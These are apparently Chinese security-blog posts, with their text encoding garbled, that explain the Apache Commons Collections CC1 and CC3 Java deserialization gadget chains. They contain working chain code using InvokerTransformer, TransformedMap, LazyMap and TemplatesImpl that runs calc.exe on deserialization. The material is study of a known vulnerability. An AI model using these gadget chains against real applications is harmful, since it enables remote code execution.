[{"title":"commons-collection3","url":"/2023/03/30/commons-collection3/","content":"\n\n## CC3\n\næ²¿ç”¨CC1çš„ç¯å¢ƒå³å¯\n\nåªæ˜¯æœ€ç»ˆå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•æ¢äº†ï¼Œåé¢é“¾å­æ²¡å•¥åŒºåˆ«\n\n## POP\n\n### newTransformer\n\nåœ¨è®² **ClassLoader** çš„ **TemplatesImpl** æ—¶è¯´åˆ°\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx43ec5db404139d987de5674f25db9f15chenghaiwen20230330234720-image-20230328233558056.png\n)\n\næœ€åæœ‰ä¸¤ä¸ª**public**ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯`newTransformer`ï¼Œè¿™æ˜¯æœ€ç»ˆå‘½ä»¤æ‰§è¡Œçš„å…¥å£\n\n### InstantiateTransformer\n\nå¦ä¸€ä¸ªæœ€å¤§çš„åŒºåˆ«å°±æ˜¯æ²¡æœ‰ä½¿ç”¨ **InvokerTransformer** ï¼Œè€Œæ˜¯ **InstantiateTransformer** \n\nè¿™ä¸ªç±»çš„`transform`çš„ç‰¹ç‚¹å°±æ˜¯ï¼Œé€šè¿‡åå°„è·å–æ„é€ æ–¹æ³•å¹¶å®ä¾‹åŒ–æŸä¸ªç±»\n\n```java\npublic Object transform(Object input) {\n    try {\n        if (input instanceof Class == false) {\n            throw new FunctorException(\n                \"InstantiateTransformer: Input object was not an instanceof Class, it was a \"\n                    + (input == null ? \"null object\" : input.getClass().getName()));\n        }\n        Constructor con = ((Class) input).getConstructor(iParamTypes);\n        return con.newInstance(iArgs);\n\n    } catch (NoSuchMethodException ex) {\n        throw new FunctorException(\"InstantiateTransformer: The constructor must exist and be public \");\n    } catch (InstantiationException ex) {\n        throw new FunctorException(\"InstantiateTransformer: InstantiationException\", ex);\n    } catch (IllegalAccessException ex) {\n        throw new FunctorException(\"InstantiateTransformer: Constructor must be public\", ex);\n    } catch (InvocationTargetException ex) {\n        throw new FunctorException(\"InstantiateTransformer: Constructor threw an exception\", ex);\n    }\n}\n```\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç±»å®ä¾‹åŒ– **TrAXFilter** ï¼Œå› ä¸ºå®ƒåœ¨æ„é€ å‡½æ•°é‡Œé¢å°±ä¼šè°ƒç”¨`newTransformer`ï¼Œæ­£å¥½ä¸²ä¸Šäº† **TemplatesImpl** çš„é“¾å­\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx3e61fd884361cbee32e0bbe50ae3ae33chenghaiwen20230330234723-image-20230328234426075.png\n)\n\n### å®Œæ•´é“¾\n\næœ€ç»ˆçš„é“¾å­ï¼ˆå°±ä¸ç»†è®²ï¼Œå¤§ä½“æ€æƒ³ä¸€æ ·ï¼ŒåŒºåˆ«å°±ä¸Šé¢ä»‹ç»çš„\n\n```java\npackage org.example;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class CC3Test {\n public static void main(String[] args) throws Exception {\n     byte[] code = Files.readAllBytes(Paths.get(\"D:\\\\tmp\\\\java\\\\classes\\\\TemplateslmplTest.class\"));\n     TemplatesImpl templatesImpl = new TemplatesImpl();\n     setFieldValue(\"_name\", \"Hello\", templatesImpl);\n     setFieldValue(\"_bytecodes\", new byte[][]{code}, templatesImpl);\n     setFieldValue(\"_outputProperties\", new Properties(), templatesImpl);\n     setFieldValue(\"_indentNumber\", 0, templatesImpl);\n     setFieldValue(\"_tfactory\", new TransformerFactoryImpl(), templatesImpl);\n\n     Transformer[] transformers = new Transformer[]{\n             new ConstantTransformer(TrAXFilter.class),\n             new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})\n     };\n     ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n     Map<Object, Object> map = new HashMap<>();\n     Map<Object, Object> lazyMap = LazyMap.decorate(map, chainedTransformer);\n\n     Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n     Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\n     annotationInvocationHandlerConstructor.setAccessible(true);\n     InvocationHandler i = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, lazyMap);\n\n     Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, i);\n\n     Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, mapProxy);\n     serialize(o);\n     unserialize(\"ser.bin\");\n }\n\n    public static void setFieldValue(String name, Object value, Object obj) throws Exception{\n        Field f = obj.getClass().getDeclaredField(name);\n        f.setAccessible(true);\n        f.set(obj, value);\n    }\n\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"ser.bin\"));\n        Object obj = ois.readObject();\n        return obj;\n    }\n\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx79cae0ebdaaa34ae79341d2d7abb5300chenghaiwen20230330234726-image-20230328235841676.png)\n","tags":["javaå®‰å…¨"]},{"title":"commons-collection1","url":"/2023/03/30/commons-collection1/","content":"\n\n# ç¯å¢ƒæ­å»º\n\n\n**jdk_8u65** ç½‘ä¸Šéšä¾¿æ‰¾çš„ä¸€ä¸ª\n\n[sunæºç åŒ…](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4) ä¸‹è½½åè§£å‹ï¼ŒæŠŠ `jdk-af660750b2f4/src/share/classes/sun` æ”¾åˆ°jdkä¸­srcâ½‚ä»¶å¤¹ä¸­ï¼Œé»˜è®¤æœ‰ä¸ªsrc.zip éœ€è¦å…ˆè§£å‹\n\n**è¿˜è¦å¯¼å…¥src**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxb4b959368a97541ee99cb9ce55f94e74chenghaiwen20230330231230-image-20230327163612053.png\n)\n\næ–°å»º**maven**é¡¹ç›®\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa695cf55618458b21f863dfe8adcfaa9chenghaiwen20230330231233-image-20230322171917611.png\n)\n\næ‰¾åˆ°cc1é“¾ï¼Œå­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬\n\nhttps://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd4e8406dd0eaa317d3a413182c18044fchenghaiwen20230330231236-image-20230322172032540.png\n)\n\nå¥—ä¸Š`<dependencies>`\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx584e7aec0dac759ce9ee3d7daa45b930chenghaiwen20230330231238-image-20230322172055370.png\n)\n\n**xml**é‡è½½ä¸€ä¸‹ï¼Œç„¶åä¸‹è½½**commons-collections**æºç \n\n# æ¼æ´åˆ†æ\n\né‚£ä¹ˆå°±å¼€å§‹åˆ†æäº†\n\n## æ¼æ´å¤„\n\n### Transformeræ¥å£\n\nåœ¨**Transformer.java**ä¸­å®ç°äº†è¿™ä¸ªæ¥å£\n\n```java\npublic interface Transformer {\n\n    /**\n     * Transforms the input object (leaving it unchanged) into some output object.\n     *\n     * @param input  the object to be transformed, should be left unchanged\n     * @return a transformed object\n     * @throws ClassCastException (runtime) if the input is the wrong class\n     * @throws IllegalArgumentException (runtime) if the input is invalid\n     * @throws FunctorException (runtime) if the transform cannot be completed\n     */\n    public Object transform(Object input);\n\n}\n```\n\næ³¨æ„è¿™ä¸ª**transform**æ–¹æ³•ï¼Œæ¥å—çš„æ˜¯ä¸€ä¸ª`Object`\n\nideaæŒ‰ `ctrl+alt+b`æŸ¥çœ‹å®ç°è¯¥æ¥å£çš„ç±»![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx854c7871de6034b45c10dbd18a808053chenghaiwen20230330231241-image-20230322204202014.png\n)\n\nå…·ä½“å°±ä¸ä¸€ä¸ªä¸ªçœ‹äº†ï¼Œæ¼æ´ç‚¹å°±åœ¨`InvokerTransformer`\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable\n```\n\nå®ƒå¯¹äº**transform**çš„å®ç°æ˜¯è¿™æ ·å†™çš„\n\n```java\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        }\n        try {\n            Class cls = input.getClass();\n            Method method = cls.getMethod(iMethodName, iParamTypes);\n            return method.invoke(input, iArgs);\n                \n        } catch (NoSuchMethodException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\");\n        } catch (IllegalAccessException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\");\n        } catch (InvocationTargetException ex) {\n            throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex);\n        }\n    }\n```\n\nå¯ä»¥çœ‹åˆ°ï¼Œ**try**è¿™é‡ŒåŸºæœ¬ä¸Šå°±æ˜¯åå°„å¸¸ç”¨çš„å‡ ä¸ªç‚¹ï¼Œè€Œ**iMethodName**å’Œ**iArgs**åœ¨æ„é€ å‡½æ•°é‡Œæ˜¯å¯ä»¥æ§åˆ¶çš„\n\nå®ƒåˆæ­£å¥½ç»§æ‰¿äº†**Serializable**ï¼Œæ˜¯å¯ä»¥ååºåˆ—åŒ–çš„\n\næ™®é€šjavaåå°„å‘½ä»¤æ‰§è¡Œ\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    Class c = Runtime.class;\n    Method execMethod = c.getMethod(\"exec\", String.class);\n    execMethod.invoke(r, \"calc.exe\");\n}\n```\n\nå…ˆæ­£å‘å®ç°ä¸€ä¸‹\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    invokerTransformer.transform(r);\n    }\n```\n\næŒ‰ç…§å®ƒçš„æ„é€ å‡½æ•°ä¼ ï¼Œç¬¬äºŒä¸ªæ˜¯**Classæ•°ç»„**ï¼Œç¬¬ä¸‰ä¸ªæ˜¯**Objectæ•°ç»„**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx8757558594dc31b83a7e298b3a9c4e54chenghaiwen20230330231244-image-20230322210123115.png\n)\n\næ¼æ´ç‚¹è¯æ˜å­˜åœ¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾è¯¥`transform`çš„è°ƒç”¨é“¾ï¼Œæ€ä¹ˆç”¨æ‰èƒ½è°ƒç”¨åˆ°è¿™ä¸ª`transform`ï¼Œæˆ–è€…æ˜¯åŒå`transform`å‡½æ•°\n\n## å¯»æ‰¾æ¼æ´é“¾\n\nå³é”®**Find usages**\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxad0ec958e1942836c88605339c126eb9chenghaiwen20230330231246-image-20230322210424098.png\n)\n\næ¥ä¸‹æ¥å°±æ˜¯æ…¢æ…¢æ‰¾\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxe298f89cf2973071acab99534867f5c6chenghaiwen20230330231249-image-20230322210636121.png\n)\n\nåƒè¿™ç§`transform`é‡Œè°ƒç”¨`transform`å°±ä¸ç”¨çœ‹äº†\n\nå¯åˆ©ç”¨çš„å¤§æ¦‚æ˜¯è¿™ä¹ˆäº›æ–¹æ³•\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx184308c6b4803d7616406862c8d86306chenghaiwen20230330231251-image-20230322211046509.png\n)\n\n**ç§‰æŒç€ä¸€èˆ¬æ‰¾Mapè¡ç”Ÿç±»çš„åšæ³•**ï¼Œå°±å…ˆçœ‹Mapé‡Œé¢çš„\n\n### TransformedMap\n\næ­¤æ—¶è¿›å…¥åˆ°**TransformedMap**\n\næ„é€ æ–¹æ³•æ˜¯**protected**çš„ï¼Œçœ‹é™æ€æ–¹æ³•\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx978af6aef3631b2bf7f0957c85e1af41chenghaiwen20230330231254-image-20230322212724105.png\n)\n\nç„¶åå°±çœ‹è¿™ä¸‰ä¸ªå…·ä½“æ–¹æ³•\n\n#### transformKey\n\nå®ƒåªæœ‰è¿™ä¸¤å¤„å¯ä»¥è°ƒç”¨ï¼Œputä¸€çœ‹å°±çŸ¥é“ï¼Œå¡«å……Map\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx25043bdbbe7513b8667fde877d84518echenghaiwen20230330231256-image-20230322213248739.png\n)\n\näºæ˜¯å¯ä»¥å†™å‡ºè¿™ç§åŠæˆé“¾\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    Map map = new HashedMap();\n    Map transformedMap = TransformedMap.decorate(map, invokerTransformer, null);\n    transformedMap.put(r, \"value\");\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx3f952320fe63e91867fe61b1cc1c92b5chenghaiwen20230330231258-image-20230322213810651.png\n)\n\n#### transformValue\n\næ¥ä¸‹æ¥çœ‹ç¬¬äºŒä¸ª\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx334dfcab3981410f2de3f6399c55f114chenghaiwen20230330231302-image-20230322213918135.png\n)\n\nåŒæ ·ä¹Ÿæ˜¯putï¼Œåªä¸è¿‡ä¸€ä¸ªæ˜¯keyï¼Œä¸€ä¸ªæ˜¯valueï¼Œæ¢æ¢ä½ç½®å°±è¡Œ\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    Map map = new HashedMap();\n    Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer);\n    transformedMap.put(\"key\", r);\n}\n```\n\n#### checkSetValue\n\nä½†æ˜¯å‰é¢ä¸¤ä¸ªéƒ½åªèƒ½åœ¨æœ¬ç±»ä¸­è¿›è¡Œè°ƒç”¨ï¼Œå¯åˆ©ç”¨æ€§ä¸å¤§\n\næœ€åæ˜¯è¿™ä¸ª\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd9f309ba40fa0b3b2040bbcd9b1363e9chenghaiwen20230330231304-image-20230322214130763.png\n)\n\nè¿™ä¸ª**AbstractInputCheckedMapDecorator**æ˜¯**TransformedMap**çš„çˆ¶ç±»\n\nè€Œå®ƒçš„åå­—å«`setValue()`ï¼Œæ ¹æ®åå­—æ¥ç†è§£ï¼Œè¿™å°±æ˜¯å¯¹mapéå†çš„èµ‹å€¼çš„æ—¶å€™è°ƒç”¨çš„å‡½æ•°\n\n> AbstractInputCheckedMapDecorator æ˜¯ TransformedMap çš„çˆ¶ç±»ã€‚å¯¹ HashMap æ¯”è¾ƒç†Ÿæ‚‰çš„ è¯å¯¹ Map.Entry ä¸€å®šä¹Ÿä¸ä¼šé™Œç”Ÿã€‚ è¿™é‡Œç®€å•è¯´ä¸€ä¸‹ï¼Œæˆ‘ä»¬çŸ¥é“ Map æ˜¯ç”¨æ¥å­˜æ”¾é”®å€¼å¯¹çš„ï¼ŒHashMap ä¸­ä¸€å¯¹ k-v æ˜¯å­˜æ”¾åœ¨ HashMap$Node ä¸­çš„ï¼Œè€Œ Node åˆå®ç°äº† Entry æ¥å£ï¼Œæ‰€ä»¥å¯ä»¥ç²—ç•¥åœ°è®¤ä¸º k-v æ˜¯å­˜æ”¾åœ¨ Entry ä¸­çš„ï¼Œéå† Map æ—¶,å¯ä»¥é€šè¿‡ entrySet()æ–¹æ³•è·å–åˆ°ä¸€å¯¹å¯¹çš„ k-vï¼ˆMap.Entry ç±» å‹ï¼‰ã€‚å¦‚ä¸‹ä»£ç ï¼Œé€šè¿‡éå† TransformedMapï¼Œå†ä½¿ç”¨ setValue()ä¼ å…¥\n\nå¼•ç”¨ä¸€ä¸ªå¸ˆå‚…çš„ï¼Œæ­¤æ—¶å°±ç›¸å½“äºæ˜¯ï¼Œ**entry**å‚¨å­˜äº†keyå’Œvalueï¼Œç„¶åå¯¹**entry**æŒ‡å‘`setValue`ï¼Œå°±æ˜¯æ›´æ”¹æ­¤æ—¶valueçš„å€¼\n\nè°ƒè¯•åˆ°è¿™é‡Œçš„æ—¶å€™ä¹Ÿèƒ½å¾ˆæ˜æ˜¾çš„çœ‹åˆ°\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxd25945fd6e165e7768f8f8e098a88d94chenghaiwen20230330231307-image-20230322215339299.png\n)\n\nè€Œè¿™é‡Œä¸ºä»€ä¹ˆä¼šæ‰§è¡Œ**AbstractInputCheckedMapDecorator**çš„è¯¥æ–¹æ³•å‘¢\n\nå› ä¸º**AbstractInputCheckedMapDecorator**æ˜¯å®ƒçš„çˆ¶ç±»ï¼Œå†…ç½®äº†è¯¥`setValue`æ–¹æ³•ï¼Œåœ¨**TransformedMap**ç±»ä¸­å¹¶æœªå¯¹è¯¥æ–¹æ³•è¿›è¡Œé‡å†™ï¼Œæ‰€ä»¥æ‰§è¡Œ`setValue`æ—¶æ˜¯èµ°åˆ°è¿™é‡Œ\n\n```java\npublic static void main(String[] args) throws Exception {\n    Runtime r = Runtime.getRuntime();\n    InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\n    Map map = new HashedMap();\n    map.put(\"key\", \"value\");\n    Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);\n    for (Map.Entry entry : transformedMap.entrySet()) {\n        entry.setValue(r);\n    }\n}\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx5dda03c7628ca90286b9496023d2ce75chenghaiwen20230330231309-image-20230322215554555.png\n)\n\n### AnnotationInvocationHandler\n\nå‰é¢ä¸¤ä¸ªéƒ½æ˜¯è¯¥ç±»çš„æ–¹æ³•ï¼Œé“¾å­ä¸èƒ½è¿›è¡Œåˆ°`readObject`ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±çœ‹**AbstractInputCheckedMapDecorator**çš„`setValue`äº†\n\nè™½ç„¶38å¤„æœ‰ç‚¹å¤šï¼Œä½†æ˜¯æœ‰ä¸€å¤„çš„`readObject`ç›´æ¥è°ƒç”¨äº†è¯¥æ–¹æ³•\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxff88125617492a10b033746ae1bb4a4echenghaiwen20230330231312-image-20230322220207340.png\n)\n\næ­£æ˜¯éå†çš„æ—¶å€™è°ƒç”¨çš„\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx4d487334993a16d3e1d62880827bfa9fchenghaiwen20230330231314-image-20230322220312016.png\n)\n\nä½†æ˜¯å®ƒçš„æ„é€ å‡½æ•°å’Œæ„é€ å™¨éƒ½ä¸æ˜¯**public**çš„ï¼ˆæ²¡å†™publicç­‰ï¼Œå°±æ˜¯**default**ç±»å‹\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxe7fe43e8b9e00db7e6d33b5788c5fe7echenghaiwen20230330231317-image-20230322220646611.png\n)\n\n**default**åªèƒ½åœ¨è¯¥**package**ä¸‹æ‰èƒ½å¾—åˆ°ï¼Œæ‰€ä»¥åªèƒ½ç”¨åå°„ï¼Œæ„é€ ä¹Ÿåªèƒ½åå°„æ„é€ \n\n#### åå°„\n\nå…ˆä¸ç®¡å…¶å®ƒçš„ï¼ŒæŠŠè¯¥ç±»åå°„å‡ºæ¥\n\næ„é€ å‡½æ•°\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxf0c7e9bfe8d162e78cc0c5018fe37a25chenghaiwen20230330231320-image-20230322221418188.png\n)\n\nç¬¬ä¸€ä¸ªç±»å‹æ˜¯ç»§æ‰¿äº†æ³¨è§£çš„Classï¼Œç¬¬äºŒä¸ªå°±æ˜¯Map\n\nå‘ƒå‘ƒ\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx51dbf16f22cfbc0afe31f2bfcb7e5686chenghaiwen20230330231322-image-20230322221759522.png\n)\n\nè€Œ**Override**å°±æ˜¯ä¸€ä¸ªæ³¨è§£ï¼Œæ‰€ä»¥å®ä¾‹åŒ–çš„æ—¶å€™ç›´æ¥**Override.class**å°±å¯ä»¥äº†\n\nå®ä¾‹åŒ–ä»£ç \n\n```java\nClass c = Class.forName(\"sun,reflect.annotation.AnnotationInvocationHandler\");\nConstructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\nannotationInvocationHandlerConstructor.setAccessible(true);\nObject o = annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);\n```\n\næ­¤æ—¶å¦‚æœæ­£å¸¸åºåˆ—åŒ–æœ€ç»ˆå¾—åˆ°çš„oï¼Œç„¶åååºåˆ—åŒ–æŒ‰ç†æƒ³çŠ¶å†µå°±å¯ä»¥rceäº†\n\nä½†æ˜¯è¿˜æœ‰å‡ ä¸ªé—®é¢˜\n\n### Runtimeä¸å¯åºåˆ—åŒ–\n\nRuntimeä¸å¯åºåˆ—åŒ–ï¼Œä½†æ˜¯å®ƒçš„**Class**æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œå³`Runtime.Class`\n\n```java\nClass r = Runtime.class;\nMethod getRuntimeMethod = r.getMethod(\"getRuntime\", null);\nRuntime runtime = (Runtime) getRuntimeMethod.invoke(null, null);\nMethod execMethod = r.getMethod(\"exec\", String.class);\nexecMethod.invoke(runtime, \"calc.exe\");\n```\n\nåå°„å‘½ä»¤æ‰§è¡Œæ˜¯è¿™æ ·çš„ï¼Œè€Œè¿™æ¯ä¸€æ­¥éƒ½è¦åˆ©ç”¨**InvokerTransformer**æ¥æ‰§è¡Œ\n\næˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹**InvokerTransformer**çš„ç›¸å…³å‚æ•°\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxa6249ce1dc4e4e4ba4e0b03b4094211dchenghaiwen20230330231324-image-20230322234354747.png\n)\n\n**iMethodName**å¾ˆæ˜æ˜¾å°±æ˜¯å‡½æ•°åï¼Œè€Œ**iParamTypes**æ˜¯**paramTypes**çš„å…ƒç´ åœ¨è¿™é‡Œå°±æ˜¯**iMethodName**è¯¥å‡½æ•°çš„å‚æ•°ç±»å‹ï¼Œä¾‹å¦‚æˆ‘ä»¬æƒ³æ‰§è¡Œ`getMethod()`ï¼Œåœ¨è¿™é‡Œå°±å¾—ä¼ å…¥`getMethod()`çš„å‚æ•°ç±»å‹\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx096e530027c6d97b71c530b825f6dbe9chenghaiwen20230330231327-image-20230322234634993.png\n)\n\né‚£ä¹ˆç¬¬ä¸€æ­¥ï¼Œå¾—åˆ°**getRuntimeMethod**ï¼Œå³å¯¹`Runtime.class`æ‰§è¡Œ`getMethod()`ï¼Œå‚æ•°ç±»å‹ä¸ºStringå’ŒClassï¼Œä½†æ¥å—çš„**paramTypes**ä¸ºClassæ•°ç»„ï¼Œæ‰€ä»¥å¾—ä¼ `new Class[]{String.class, Class[].class}`ï¼Œç¬¬ä¸€ä¸ªå‚æ•°Stringä¸º**getRuntime**ï¼Œç¬¬äºŒä¸ªä¸ºnull\n\næœ€ç»ˆç¼–å†™å¦‚ä¸‹\n\n```java\nMethod getRuntimeMethod = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);\n```\n\næ¥ä¸‹æ¥`Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);`ï¼Œå°†å¾—åˆ°çš„é™æ€æ„é€ å‡½æ•°æ‰§è¡Œï¼Œå®ä¾‹å‡ºä¸€ä¸ª**Runtime**\n\nå°±æ˜¯å¯¹**getRuntimeMethod**æ‰§è¡Œ`invoke`ï¼Œä¸¤ä¸ªå‚æ•°åˆ†åˆ«å¦‚ä¸‹\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxc1a9e627e92e98a29adcfff1307bf8c2chenghaiwen20230330231329-image-20230322234913153.png\n)\n\næœ€ç»ˆç¼–å†™\n\n```java\nRuntime r = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);\n```\n\næœ€åå°±æ˜¯ç›´æ¥å¯¹å®ä¾‹åŒ–å‡ºæ¥çš„**Runtime**æ‰§è¡Œ`exec`ï¼Œå‚æ•°å¦‚ä¸‹\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx185906c627eb919b11cc70b773344dd6chenghaiwen20230330231331-image-20230322235200680.png\n)\n\nå‚æ•°å€¼ä¸º**calc.exe**ï¼Œæœ€ç»ˆç¼–å†™\n\n```java\nnew InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}).transform(r);\n```\n\næˆåŠŸæ‰§è¡Œ![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx2d62c685bcc08f53d565fcf3c39b1fcechenghaiwen20230330231334-image-20230322235251633.png\n)\n\nè¿™é‡Œæœ‰ä¸€ä¸ªå°ä¼˜åŒ–ï¼Œå°±æ˜¯ç±»**ChainedTransformer**\n\nè¯¥ç±»æ„é€ æ˜¯æ¥å—ä¸€ä¸ª**Transformer**æ•°ç»„\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunxcfb286b374d34b639db906aa23077f5bchenghaiwen20230330231337-image-20230323000015796.png\n)\n\nç„¶åå®ƒçš„**transform**æ˜¯å¯¹**Transformer**æ•°ç»„å…ƒç´ å¾ªç¯æ‰§è¡Œ`transform`\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx229b7c70a8cc927d86d0ccac285cd150chenghaiwen20230330231340-image-20230323000044060.png\n)\n\nç„¶åä¸Šä¸€ä¸ªæ‰§è¡Œå®Œå¾—åˆ°çš„**object**å……å½“ä¸‹ä¸€è½®çš„`transform`å¯¹è±¡ï¼Œæœ¬æ¥æˆ‘ä»¬éœ€è¦ä¼ å…¥çš„ä¹Ÿåªæœ‰**Runtime.class**\n\næœ€åå¾—åˆ°\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n};\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nchainedTransformer.transform(Runtime.class);\n```\n\n![](https://raw.githubusercontent.com/xlccccc/Image/master/hexoblog/liunx0e74a97b1e43cffc7e9594ae7570df50chenghaiwen20230330231342-image-20230323000723214.png\n)\n\næ‰€ä»¥ç›®å‰ï¼Œç†æƒ³ä¸Šæ¥æ˜¯ç¼–å†™å‡ºè¿™æ ·çš„é“¾å­å°±å¥½äº†\n\n```java\nTransformer[] transformers = new Transformer[]{\n        new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n        new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n        new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"})\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"});\nMap map = new HashedMap();\nmap.put(\"key\", \"value\");\nMap<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);\n\nClass c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);\nannotationInvocationHandlerConstructor.setAccessible(true);\nObject o = annotationInvocationHandlerConstructor.newInstance(Override.class, transformedMap);\n```\n\n\n### ä¸¤ä¸ªif\n\n```java\nprivate void readObject(java.io.ObjectInputStream s)\n    throws java.io.IOException, ClassNotFoundException {\n    s.defaultReadObject();\n\n    // Check to make sure that types have not evolved incompatibly\n\n    AnnotationType annotationType = null;\n    try {\n        annotationType = 